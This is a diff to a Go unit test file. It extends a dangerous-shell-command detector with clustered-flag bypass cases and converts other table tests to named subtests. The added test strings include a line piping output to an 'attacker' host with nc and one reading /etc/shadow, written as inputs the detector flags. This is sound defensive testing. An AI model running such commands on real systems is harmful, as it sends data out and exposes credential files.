@@ -35,6 +35,13 @@ func TestContainsDangerousShellChars(t *testing.T) {
 		{"python3 -c payload", `python3 -c 'print(1)'`, true},
 		{"perl -e payload", `perl -e 'system("id")'`, true},
 		{"node --eval payload", `node --eval 'process.exit(0)'`, true},
+		// Clustered short-flag combinations — bash/sh re-parse inline
+		// scripts regardless of whether `c`/`e` is the only flag or is
+		// grouped with `l` (login), `i` (interactive), etc. A regex
+		// that only matches bare `-c` would let these through.
+		{"bash -lc clustered", `bash -lc 'id | nc attacker 9000'`, true},
+		{"sh -ec clustered", `sh -ec 'echo hi; cat /etc/shadow'`, true},
+		{"bash -Ec clustered", `bash -Ec 'id'`, true},
 
 		// --- awk / sed bypass -----------------------------------------
 		{"awk system()", `awk 'BEGIN{system("id")}'`, true},
@@ -64,19 +71,22 @@ func TestContainsDangerousShellChars(t *testing.T) {
 
 func TestReverseString(t *testing.T) {
 	cases := []struct {
-		in, want string
+		name, in, want string
 	}{
-		{"", ""},
-		{"a", "a"},
-		{"abc", "cba"},
-		{"áčď", "ďčá"},         // multi-byte UTF-8
-		{"abc def", "fed cba"}, // embedded space
-		{"a🙂b", "b🙂a"},         // 4-byte UTF-8 rune survives
+		{"empty", "", ""},
+		{"single ascii", "a", "a"},
+		{"ascii", "abc", "cba"},
+		{"multi-byte utf8", "áčď", "ďčá"},
+		{"embedded space", "abc def", "fed cba"},
+		{"4-byte rune", "a🙂b", "b🙂a"},
 	}
 	for _, tc := range cases {
-		if got := reverseString(tc.in); got != tc.want {
-			t.Errorf("reverseString(%q) = %q; want %q", tc.in, got, tc.want)
-		}
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			if got := reverseString(tc.in); got != tc.want {
+				t.Errorf("reverseString(%q) = %q; want %q", tc.in, got, tc.want)
+			}
+		})
 	}
 }
 
@@ -93,24 +103,28 @@ func TestNullIfEmpty(t *testing.T) {
 
 func TestEnvVarNamePattern(t *testing.T) {
 	cases := []struct {
+		name  string
 		in    string
 		valid bool
 	}{
-		{"FOO", true},
-		{"_FOO", true},
-		{"FOO_BAR", true},
-		{"foo123", true},
-		{"", false},
-		{"1FOO", false},    // leading digit
-		{"FOO-BAR", false}, // dash
-		{"FOO BAR", false}, // space
-		{"FOO=1", false},   // equals sign
-		{"FOO$", false},    // metachar
+		{"uppercase", "FOO", true},
+		{"leading underscore", "_FOO", true},
+		{"underscore between words", "FOO_BAR", true},
+		{"lowercase with digits", "foo123", true},
+		{"empty", "", false},
+		{"leading digit", "1FOO", false},
+		{"dash", "FOO-BAR", false},
+		{"space", "FOO BAR", false},
+		{"equals sign", "FOO=1", false},
+		{"metachar dollar", "FOO$", false},
 	}
 	for _, tc := range cases {
-		got := envVarNamePattern.MatchString(tc.in)
-		if got != tc.valid {
-			t.Errorf("envVarNamePattern.MatchString(%q) = %v; want %v", tc.in, got, tc.valid)
-		}
+		tc := tc
+		t.Run(tc.name, func(t *testing.T) {
+			got := envVarNamePattern.MatchString(tc.in)
+			if got != tc.valid {
+				t.Errorf("envVarNamePattern.MatchString(%q) = %v; want %v", tc.in, got, tc.valid)
+			}
+		})
 	}
 }
